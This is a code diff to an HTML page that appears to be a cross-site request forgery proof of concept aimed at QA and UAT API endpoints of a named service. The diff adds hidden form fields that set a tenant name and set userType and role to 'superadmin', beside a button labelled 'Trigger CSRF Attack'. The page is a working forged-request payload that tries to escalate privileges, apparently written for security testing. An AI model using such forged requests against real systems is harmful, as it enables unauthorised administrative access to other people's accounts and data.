@@ -11,6 +11,9 @@
 
 <h2>1️⃣ QA Environment (No CSRF Token)</h2>
 <form action="https://grow-qa.fareye.io/api/tenant/v1/merchants/testroute" method="POST">
+  <input type="hidden" name="tenant" value="couriersplease">
+  <input type="hidden" name="userType" value="superadmin">
+  <input type="hidden" name="role" value="superadmin">
   <button type="submit">🚨 Trigger CSRF Attack (QA)</button>
 </form>
 
@@ -18,6 +21,9 @@
 
 <h2>2️⃣ UAT Environment (With CSRF Token)</h2>
 <form id="uatForm" action="https://grow-uat.fareye.co/api/tenant/v1/merchants/testroute" method="POST">
+  <input type="hidden" name="tenant" value="couriersplease">
+  <input type="hidden" name="userType" value="superadmin">
+  <input type="hidden" name="role" value="superadmin">
   <!-- Note: You cannot send X-XSRF-TOKEN via plain form; this simulates a safe request -->
   <button type="submit">✅ Trigger Valid Request (UAT)</button>
 </form>
